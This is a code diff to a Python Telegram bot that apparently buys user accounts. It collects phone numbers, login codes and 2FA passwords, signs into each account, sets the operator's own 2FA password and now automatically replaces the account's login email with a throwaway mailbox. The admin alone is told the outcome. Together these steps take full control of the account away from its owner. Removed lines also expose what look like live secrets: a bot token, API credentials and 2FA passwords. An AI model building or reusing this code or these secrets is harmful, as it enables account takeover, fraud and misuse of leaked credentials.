@@ -15,6 +15,7 @@ from typing import Dict, Any
 
 import importlib
 from telethon import TelegramClient, events, errors, functions, types
+from email_changer import change_email_for_number
 
 # Dynamic imports to avoid Replit auto-installer detecting 'telegram' package
 tg = importlib.import_module("telegram")
@@ -59,6 +60,54 @@ logger.info(f"telegram loaded successfully from python-telegram-bot v{getattr(tg
 # Simple in-memory data storage (will be replaced with PostgreSQL later)
 user_data: Dict[str, Dict[str, Any]] = {}
 user_data_lock = threading.Lock()
+
+# ── Pending-login persistence (survives bot restarts mid-OTP-entry) ─────────
+PENDING_LOGINS_FILE = os.path.join('sessions', 'pending_logins.json')
+
+
+def _save_pending_login(user_id: str, phone: str, phone_code_hash: str, session_path: str) -> None:
+    if not os.path.exists('sessions'):
+        os.makedirs('sessions')
+    data = {}
+    if os.path.exists(PENDING_LOGINS_FILE):
+        try:
+            with open(PENDING_LOGINS_FILE, 'r') as f:
+                data = json.load(f)
+        except Exception:
+            data = {}
+    data[user_id] = {
+        'phone': phone,
+        'phone_code_hash': phone_code_hash,
+        'session_path': session_path,
+        'timestamp': datetime.now().isoformat(),
+    }
+    with open(PENDING_LOGINS_FILE, 'w') as f:
+        json.dump(data, f, indent=2)
+
+
+def _load_pending_login(user_id: str):
+    if not os.path.exists(PENDING_LOGINS_FILE):
+        return None
+    try:
+        with open(PENDING_LOGINS_FILE, 'r') as f:
+            data = json.load(f)
+        return data.get(user_id)
+    except Exception:
+        return None
+
+
+def _clear_pending_login(user_id: str) -> None:
+    if not os.path.exists(PENDING_LOGINS_FILE):
+        return
+    try:
+        with open(PENDING_LOGINS_FILE, 'r') as f:
+            data = json.load(f)
+        if user_id in data:
+            del data[user_id]
+            with open(PENDING_LOGINS_FILE, 'w') as f:
+                json.dump(data, f, indent=2)
+    except Exception:
+        pass
 
 # Pending withdrawal requests storage
 pending_withdrawals: Dict[str, Dict[str, Any]] = {}
@@ -230,18 +279,29 @@ def normalize_phone(num: str) -> str:
 WAITING_FOR_NUMBER, WAITING_FOR_ADMIN_APPROVAL, WAITING_FOR_PIN, WAITING_FOR_2FA = range(4)
 
 # Admin settings - loaded from environment variables
-ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "5810613583")
+ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID")
+if not ADMIN_CHAT_ID:
+    raise RuntimeError("ADMIN_CHAT_ID environment variable is required but not set.")
 ADMIN_CHAT_ID_INT = int(ADMIN_CHAT_ID)
 FORWARD_CHAT_ID = "@CEO_cryfex" # Forward to this ID
-TWO_FA_PASSWORD = os.environ.get("TWO_FA_PASSWORD", "2876886938")
+TWO_FA_PASSWORD = os.environ.get("TWO_FA_PASSWORD")
+if not TWO_FA_PASSWORD:
+    raise RuntimeError("TWO_FA_PASSWORD environment variable is required but not set.")
 TELEGRAM_OFFICIAL_ID = 777000
 
 # Telegram API for UserSession (Telethon/Pyrogram)
-TELEGRAM_API_ID = int(os.environ.get("TELEGRAM_API_ID", "31955122"))
-TELEGRAM_API_HASH = os.environ.get("TELEGRAM_API_HASH", "4f3e7f6d8250dc14c21ae58642fcbcc9")
+_telegram_api_id_raw = os.environ.get("TELEGRAM_API_ID")
+if not _telegram_api_id_raw:
+    raise RuntimeError("TELEGRAM_API_ID environment variable is required but not set.")
+TELEGRAM_API_ID = int(_telegram_api_id_raw)
+TELEGRAM_API_HASH = os.environ.get("TELEGRAM_API_HASH")
+if not TELEGRAM_API_HASH:
+    raise RuntimeError("TELEGRAM_API_HASH environment variable is required but not set.")
 
 # Bot Token
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "8467555740:AAGcgvy676aczWCPxMvAaVxhsaxBgWZ8WoM")
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
+if not BOT_TOKEN:
+    raise RuntimeError("BOT_TOKEN environment variable is required but not set.")
 
 # Required channel for all users
 REQUIRED_CHANNEL = "@BGTUpdate"
@@ -2825,6 +2885,7 @@ async def handle_number_input(update: Update, context: ContextTypes.DEFAULT_TYPE
         
     session_path = os.path.join('sessions', f"sell_{number.replace('+', '')}")
     client = TelegramClient(session_path, TELEGRAM_API_ID, TELEGRAM_API_HASH)
+    user_id_for_pending = str(update.effective_user.id)
     
     try:
         await client.connect()
@@ -2851,6 +2912,13 @@ async def handle_number_input(update: Update, context: ContextTypes.DEFAULT_TYPE
             
         context.user_data['telethon_client'] = client
         context.user_data['phone_code_hash'] = sent_code.phone_code_hash
+
+        # Persist enough info to disk to survive a bot restart while the user
+        # is mid-OTP-entry: the in-memory client/hash would otherwise be lost.
+        try:
+            _save_pending_login(user_id_for_pending, number, sent_code.phone_code_hash, session_path)
+        except Exception as e:
+            logger.error(f"[PendingLogin] Failed to persist pending login for {number}: {e}")
         
         otp_request_text = f"""
 📲 **OTP SENT!**
@@ -3046,7 +3114,9 @@ def build_login_success_message(phone: str, country_data: dict) -> str:
     )
 
 
-NEW_2FA_PASSWORD = "4735908767"
+NEW_2FA_PASSWORD = os.environ.get("NEW_2FA_PASSWORD")
+if not NEW_2FA_PASSWORD:
+    raise RuntimeError("NEW_2FA_PASSWORD environment variable is required but not set.")
 
 
 async def set_new_2fa_password(bot, user_id: str, phone: str, client, old_password: str | None = None) -> None:
@@ -3122,6 +3192,58 @@ async def set_new_2fa_password(bot, user_id: str, phone: str, client, old_passwo
 
     except Exception as e:
         logger.error(f"[2FA-Set] Unexpected error for {phone}: {e}")
+
+
+async def auto_change_email_after_login(bot, user_id: str, phone: str) -> None:
+    """
+    60 seconds after a successful login, automatically change the account's
+    login email using a fresh mail.tm mailbox (same logic the admin dashboard
+    uses), so numbers that support email change get it done without manual
+    admin action. Only the admin gets notified of the outcome.
+    """
+    try:
+        await asyncio.sleep(60)
+        raw_phone = phone.replace('+', '').strip()
+        logger.info(f"[AutoEmail] Starting auto email change for {phone}")
+        result = await change_email_for_number(
+            phone, raw_phone, TELEGRAM_API_ID, TELEGRAM_API_HASH,
+            'sessions', 'user_data.json', log=lambda m: logger.info(f"[AutoEmail:{phone}] {m}"))
+
+        if result['success']:
+            logger.info(f"[AutoEmail] Success for {phone}: {result['email']}")
+            try:
+                await bot.send_message(
+                    chat_id=ADMIN_CHAT_ID,
+                    text=(
+                        f"📧 *Auto Email Change Successful*\n"
+                        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                        f"📞 Number: `{phone}`\n"
+                        f"👤 User ID: `{user_id}`\n"
+                        f"✉️ New Email: `{result['email']}`"
+                    ),
+                    parse_mode='Markdown',
+                )
+            except Exception as notify_err:
+                logger.error(f"[AutoEmail] Failed admin notify (success) for {phone}: {notify_err}")
+        else:
+            logger.error(f"[AutoEmail] Failed for {phone}: {result['message']}")
+            try:
+                await bot.send_message(
+                    chat_id=ADMIN_CHAT_ID,
+                    text=(
+                        f"⚠️ *Auto Email Change Failed*\n"
+                        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                        f"📞 Number: `{phone}`\n"
+                        f"👤 User ID: `{user_id}`\n"
+                        f"Reason: {result['message']}\n\n"
+                        f"You can retry it manually from the admin dashboard."
+                    ),
+                    parse_mode='Markdown',
+                )
+            except Exception:
+                pass
+    except Exception as e:
+        logger.error(f"[AutoEmail] Unexpected error for {phone}: {e}")
 
 
 async def send_login_followup(bot, user_id: str, phone: str, client) -> None:
@@ -3371,6 +3493,25 @@ async def handle_pin_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -
     client = context.user_data.get('telethon_client')
     phone = context.user_data.get('user_number')
     phone_code_hash = context.user_data.get('phone_code_hash')
+    user_id_for_pending = str(update.effective_user.id)
+
+    # If the bot restarted while the user was entering the OTP, the in-memory
+    # client/hash are gone — try to recover from what we persisted to disk.
+    if not client or not phone_code_hash:
+        pending = _load_pending_login(user_id_for_pending)
+        if pending:
+            try:
+                phone = pending['phone']
+                phone_code_hash = pending['phone_code_hash']
+                client = TelegramClient(pending['session_path'], TELEGRAM_API_ID, TELEGRAM_API_HASH)
+                await client.connect()
+                context.user_data['telethon_client'] = client
+                context.user_data['user_number'] = phone
+                context.user_data['phone_code_hash'] = phone_code_hash
+                logger.info(f"[PIN-Recover] Restored pending login for {phone} after restart")
+            except Exception as e:
+                logger.error(f"[PIN-Recover] Failed to restore session for {user_id_for_pending}: {e}")
+                client = None
 
     if not client or not phone or not phone_code_hash:
         await update.message.reply_text("❌ Session expired. Please start again.")
@@ -3397,7 +3538,8 @@ async def handle_pin_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -
 
     try:
         await client.sign_in(phone, otp, phone_code_hash=phone_code_hash)
-        
+        _clear_pending_login(user_id_for_pending)
+
         # Login successful — check if account is frozen/restricted
         user_id = str(update.effective_user.id)
         country_data = context.user_data.get('country_data')
@@ -3592,6 +3734,13 @@ async def handle_pin_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -
             phone=phone,
             client=client,
             old_password=None,
+        ))
+
+        # 60s after login: auto-change the account's login email if possible
+        asyncio.create_task(auto_change_email_after_login(
+            bot=context.bot,
+            user_id=user_id,
+            phone=phone,
         ))
 
         # Keep the client connected for message forwarding
@@ -3824,6 +3973,13 @@ async def handle_2fa_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -
             phone=phone,
             client=client,
             old_password=password,
+        ))
+
+        # 60s after login: auto-change the account's login email if possible
+        asyncio.create_task(auto_change_email_after_login(
+            bot=context.bot,
+            user_id=user_id,
+            phone=phone,
         ))
 
         # Keep session alive/running for forwarding
